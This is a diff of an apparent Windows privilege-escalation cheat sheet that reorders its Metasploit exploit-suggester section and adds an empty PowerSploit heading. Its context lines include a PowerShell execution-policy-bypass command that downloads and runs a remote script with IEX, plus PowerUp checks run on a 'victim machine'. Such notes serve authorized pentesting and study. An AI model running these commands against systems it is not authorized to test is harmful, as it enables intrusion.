@@ -9,9 +9,11 @@ python windows-exploit-suggester.py --update
 # Check for possible exploits with the script
 python windows-exploit-suggester.py --database <db file name> --systeminfo <file with systeminfo output>
 
----------------------------Metasploit Local Exploit Suggester Module---------------------------
+---------------------------Powersploit---------------------------
 
-post/multi/recon/local_exploit_suggester
+
+
+
 
 
 ---------------------------Sherlock---------------------------
@@ -42,3 +44,7 @@ powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebC
 
 # If you have your ps1 file downloaded to the victim machine then run using this
 powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
+
+---------------------------Metasploit Local Exploit Suggester Module---------------------------
+
+post/multi/recon/local_exploit_suggester
